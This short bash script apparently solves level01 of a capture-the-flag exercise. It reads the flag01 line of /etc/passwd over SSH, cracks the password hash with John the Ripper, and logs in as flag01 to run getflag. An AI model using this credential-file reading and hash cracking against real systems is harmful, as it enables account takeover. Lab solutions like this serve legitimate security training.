#!/usr/bin/env bash

set -euo pipefail

PARENT_DIR="$(dirname "$0")"
UTILS_DIR="$PARENT_DIR/../utils"

PATH="$UTILS_DIR:$PATH"

which john >/dev/null || (echo "You need to install john using your packet manager!" 1>&2 && exit 1)

host="$1"
port="$2"
pass="$3"

pass="$(john --show <(sshexec.sh "$host" "$port" level01 "$pass" "grep 'flag01' /etc/passwd | cut -d':' -f-2") | head -n1 | cut -d':' -f2)"
sshexec.sh "$host" "$port" flag01 "$pass" getflag
